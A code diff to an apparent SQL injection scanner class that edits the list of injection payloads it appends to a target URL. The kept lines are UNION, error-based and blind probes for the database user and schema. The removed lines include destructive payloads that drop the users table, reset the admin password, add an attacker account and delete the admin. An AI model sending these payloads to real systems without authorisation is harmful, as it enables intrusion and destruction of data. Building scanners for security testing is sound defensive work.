@@ -68,26 +68,12 @@ class SQLInjectionScanner:
 
             for query in [
                 f"1' UNION SELECT null, current_user, null; --",
-                f"1' UNION SELECT null, session_user, null; --",
-                f"1' UNION SELECT null, user, null; --",
                 f"1' OR 1=CONVERT(int, (SELECT current_user)); --",
-                f"1' OR 1=CONVERT(int, (SELECT session_user)); --",
-                f"1' OR 1=CONVERT(int, (SELECT user)); --",
                 f"1' OR IF(1=1, current_user, 0) --",
-                f"1' OR IF(1=1, session_user, 0) --",
-                f"1' OR IF(1=1, user, 0) --",
                 f"1' OR 1=CONVERT(int, (SELECT current_database())); --",
                 f"1' OR 1=CONVERT(int, (SELECT current_schema())); --",
-                f"1' OR 1=CONVERT(int, (SELECT version())); --",
-                f"1' OR 1=CONVERT(int, (SELECT pg_backend_pid())); --",
                 f"1' OR SUBSTRING(current_user, 1, 1) = 'a'; --",
                 f"1' OR IF(1=1, (SELECT current_user LIKE 'a%'), 0); --",
-                f"1' OR IF(1=1, (SELECT session_user = 'pg_user'), 0); --",
-                f"1' OR IF(1=1, (SELECT user = 'public'), 0); --",
-                f"'; DROP TABLE users; --",
-                f"'; UPDATE users SET password = 'malicious' WHERE username = 'admin'; --",
-                f"'; INSERT INTO users (username, password) VALUES ('attacker', 'malicious'); --",
-                f"'; DELETE FROM users WHERE username = 'admin'; --",
             ]:
                 post_data = {}
                 full_url = f'{self.target_url}+{query}'
